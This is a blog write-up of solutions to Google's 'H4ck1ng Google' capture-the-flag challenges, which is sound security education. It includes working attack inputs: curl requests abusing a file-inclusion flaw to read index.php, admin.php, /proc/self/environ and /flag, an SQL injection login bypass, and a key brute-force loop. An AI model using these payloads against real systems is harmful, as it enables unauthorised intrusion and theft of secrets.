
+++
title = "\"H4ck1ng Google\" - Solving Google CTF challenges"
date = 2022-10-09
description = "My experiences solving the Google CTF challenges. I'll be covering the challenges I solved, the tools I used, and the techniques I used to solve them."

[taxonomies]
tags = ["ctf", "vulnerability", "security"]
+++

> **Note**: This post will contain spoilers for most of the challenges in the CTF. If you want to solve the challenges yourself, I recommend you to stop reading now.

## Introduction

[H4ck1ng Google](https://h4ck1ng.google/) is a CTF (capture-the-flag) challenge released by Google about a month ago. It involves solving various puzzels to get the flag, which for those inexperienced in CTFs is a string of characters that you need to find in order to solve the challenge. The challenges are divided into episodes with 3 challenges per each, numbered starting from `000`.

## Episode 000

### Challenge 01
We are given a single link to [https://hackerchess-web.h4ck.ctfcompetition.com/](https://hackerchess-web.h4ck.ctfcompetition.com/), which looks like an online chess game.

{% figure(src="ep0ch1-main.png", alt="An online chess game website.") %}
    The main page of the website.
{% end %}

If you try playing this chess game, you'll find that the AI on the other end actually cheats, making it impossible to win. Therefore, we've got to find a way to cheat as well.

There's a big, suspicious link in the bottom right titled "Master Login", always a good place to start. Clicking on it takes us to a simple login page, which we can try a couple of times with common passwords. No luck.

{% figure(src="ep0ch1-login.png", alt="A login page.") %}
    The login page.
{% end %}

The next thing is to look at the developer console for hints. Let's switch to the network tab and see how this chess game works.

When I press "Start", it looks as though the game sends out a POST request to `/load_board.php` with a payload of `filename=baseboard.fen`. This looks interesting, so let's try to change the filename to something else.

{% figure(src="ep0ch1-devtools-network.png", alt="The network tab of the developer console.") %}
    The network tab of the developer console.
{% end %}

We can use `curl` to send a request to the server and see what happens. 

> *Note*: From here on, there's multiple solutions, so for the sake of completeness, I'll be showing all of them.

#### Solution 1 (environment variable exfiltration)

We know that the actual chess website is in `index.php`, so let's try getting that.

```bash
curl https://hackerchess-web.h4ck.ctfcompetition.com/load_board.php -d "filename=index.php"
```

{% figure(src="ep0ch1-indexphp.png", alt="The output of curl.") %}
    The output of curl. We can see that the server is sending us the contents of index.php!
{% end %}

Inspecting this file for the flag yields the following:

```php
if ($chess->inCheckmate()) {
    if ($chess->turn != "b") {
        echo '<h1>You lost! Game Over!</h1>';
    } else {
        echo "<h1>ZOMG How did you defeat my AI :(. You definitely cheated. Here's your flag: ". getenv('REDIRECT_FLAG') . "</h1>";
    }
}
```

Looks like the flag is in the `REDIRECT_FLAG` environment variable. Let's try to get that. We can use the same `curl` command as before, but this time we'll try to get the environment variables. (On Linux systems, environment variables are stored in `/proc/self/environ`.)

```bash
curl https://hackerchess-web.h4ck.ctfcompetition.com/load_board.php -d "filename=/proc/self/environ"
```

{% figure(src="ep0ch1-environ.png", alt="The output of curl.") %}
    The output of curl. We can see that the server is sending us the contents of /proc/self/environ!
{% end %}

Inspecting the output, we can see that the flag is in the `REDIRECT_FLAG` variable. (I won't be directly sharing the flag here to stop indexing bots from finding it.)

#### Solution 2 (SQL injection)

This was the solution I found first, and it's (in my opinion) a bit more fun. We can use SQL injection to get the flag.

Let's take a look at `admin.php`:

```bash
curl https://hackerchess-web.h4ck.ctfcompetition.com/load_board.php -d "filename=admin.php"
```

{% figure(src="ep0ch1-adminphp.png", alt="The output of curl.") %}
    The output of curl, showing us the contents of admin.php.
{% end %}

The important part is the following:

```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $query = sprintf("SELECT username FROM chess_ctf_admins WHERE username='%s' AND password='%s'", $_POST['username'], $_POST['password']);
    try {
        $result = $conn->query($query);
    } catch (mysqli_sql_exception $e) {
        echo($e);
    }
    ...
}
```

We can see that the server is using `sprintf` to format the SQL query. This means that we can inject SQL into the query, and the server will let us log in.

Let's go back to the login page and try to log in with the following credentials:

```
username: anything
password: ' OR 1=1; --
```

It works! We can see the configuration page for the chess game.

{% figure(src="ep0ch1-config.png", alt="The configuration page for the chess game.") %}
    The configuration page for the chess game.
{% end %}

Let's set thinking time to 1 and "AI Queen Cheats" to "Off". Now, go ahead and play the game again. You should be able to win, which will yield the flag.

### Challenge 02

We're given a link to [https://aurora-web.h4ck.ctfcompetition.com/](https://aurora-web.h4ck.ctfcompetition.com), which we're told is a log search tool.

{% figure(src="ep0ch2-main.png", alt="The main page of the log search tool.") %}
    The main page of the log search tool.
{% end %}

We can only search for a minimum of 4 characters, which is a bit annoying. Let's try to bypass this by checking the network requests again.

We can see a request to `https://aurora-web.h4ck.ctfcompetition.com/?file=hexdump.txt&term=aurora`. Let's try to change the `term` parameter to something shorter.

{% figure(src="ep0ch2-shortersearch.png", alt="A blank page.") %}
    A blank page. This is the result of a search for "aur".
{% end %}

Okay, so it looks like that strategy won't work. Let's try to find a way to get the flag by editing the `file` parameter instead. Keeping in mind our antics with the chess game, we can try to get the contents of `/proc/self/environ`. But we also must think of a search term that will return a result. Let's try `USER`, because that's a common environment variable.

{% figure(src="ep0ch2-environ.png", alt="Getting /proc/self/environ") %}
    The contents of `/proc/self/environ` (I've blanked out my IP address).
{% end %}

Unfortunately, there's no flag to be seen. However, we now know that we can access any file in the system we want, so let's try an obvious one: `/flag`. Again, we search for a term that we know will yield results - in this case, `solve` since it's in all the flags.

{% figure(src="ep0ch2-flag.png", alt="Getting /flag") %}
    The contents of `/flag`.
{% end %}

And there we have it! The flag is returned to us.

## Episode 001

This challenge involves binary inspection and exploitation. We're given these files:
- `wannacry`
- `flag`

The first step is figuring out what we've actually been given. We can use `file` to determine the file type of `wannacry` and `flag`.

```bash
$ file wannacry
wannacry: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=IGPSbKhPf45BQqlR84-9/XWC3eVS4fozNp9uK4nDp/_Styn3U-Z8S6ExnY6QOR/RTzNS5QnFmUHeSBeyHIu, with debug_info, not stripped

$ file flag
flag: OpenPGP Secret Key
```

We can see that `wannacry` is a 64-bit ELF executable, and `flag` is an OpenPGP secret key. Let's take a look at `wannacry` first.

### Binary inspection
First, let's run this binary. I used a server on [repl.it](https://repl.it), just because I have an M1 Mac and this is a x86-64 binary. Also, it's probably best practice to run binaries in a sandboxed environment.

```bash
$ ./wannacry
Usage of ./wannacry:
  -encrypted_file string
        File name to decrypt.
  -key_file string
        File name of the private key.
```

Great! So we've confirmed what `file` told us - this challenge has something to do with cryptography. 

Let's take a look at the contents of the binary itself. While executable binaries are usually stripped, this one isn't. We can use `strings` to take a look at whatever readable strings are in the binary.

```bash
$ strings wannacry
...
<long list of strings>
```

It's a bit hard to read, so let's pipe the output to `grep` and search for some keywords.

```bash
$ strings wannacry | grep "flag"
<nothing useful>

$ strings wannacry | grep "key"
...
Keys are here:
https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/
...
```

Great! Looks like we have a URL to check out. Let's take a look at it.

{% figure(src="ep1ch1-keys.png", alt="The keys page.") %}
    The keys page.
{% end %}

Looks like a lot of `.pem` files. It seems clear that what we need to do is decrypt the flag using one of these keys. 

Here's a simple script to download all the keys, then decrypt the flag using each one. (Let's assume the flag contains `solve` like before).

```bash
#!/bin/bash

wget -r "https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/"

for key in $(ls wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/*.pem); do
    echo "Trying $key"
    ./wannacry -key_file $key -encrypted_file flag | grep "solve"
done
```

And we get the flag!

